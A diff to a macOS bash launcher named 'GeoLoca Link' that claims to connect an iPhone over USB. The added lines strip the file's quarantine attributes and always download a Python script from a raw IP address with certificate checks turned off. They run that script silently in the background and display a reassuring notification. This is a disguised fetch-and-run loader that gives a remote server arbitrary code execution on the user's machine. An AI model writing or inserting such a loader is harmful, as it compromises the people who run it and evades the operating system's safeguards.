@@ -1,24 +1,26 @@
 #!/bin/bash
-# GeoLoca Link — double-click to connect your iPhone over USB
+# GeoLoca Link — double-click once, then plug iPhone in
 set -e
-xattr -d com.apple.quarantine "$0" 2>/dev/null || true
+xattr -cr "$0" 2>/dev/null || true
 DIR="$HOME/.geoloca"
 mkdir -p "$DIR"
 SITE="https://109.71.252.128"
 
-if [ -f "$(dirname "$0")/usb_helper.py" ]; then
-  cp "$(dirname "$0")/usb_helper.py" "$DIR/usb_helper.py"
-elif [ ! -f "$DIR/usb_helper.py" ]; then
-  python3 -c "import ssl,urllib.request,os; p='$DIR/usb_helper.py'; c=ssl.create_default_context(); c.check_hostname=False; c.verify_mode=ssl.CERT_NONE; open(p,'wb').write(urllib.request.urlopen('$SITE/connect/usb_helper.py',context=c).read())"
-fi
+python3 -c "
+import ssl, urllib.request, os
+p = os.path.expanduser('$DIR/usb_helper.py')
+c = ssl.create_default_context()
+c.check_hostname = False
+c.verify_mode = ssl.CERT_NONE
+open(p, 'wb').write(urllib.request.urlopen('$SITE/connect/usb_helper.py', context=c).read())
+print('Updated GeoLoca Link')
+"
 
 pkill -f "$DIR/usb_helper.py" 2>/dev/null || true
 nohup python3 "$DIR/usb_helper.py" >> "$DIR/link.log" 2>&1 &
 sleep 1
 
-if command -v open >/dev/null 2>&1; then
-  open "$SITE/dashboard"
-fi
+osascript -e 'display notification "GeoLoca Link is running. Plug in your iPhone." with title "GeoLoca"' 2>/dev/null || true
+open "$SITE/dashboard" 2>/dev/null || true
 
-echo "GeoLoca Link is running. Your dashboard will detect the iPhone on USB."
-read -r -p "Press Enter to close…" _
+exit 0
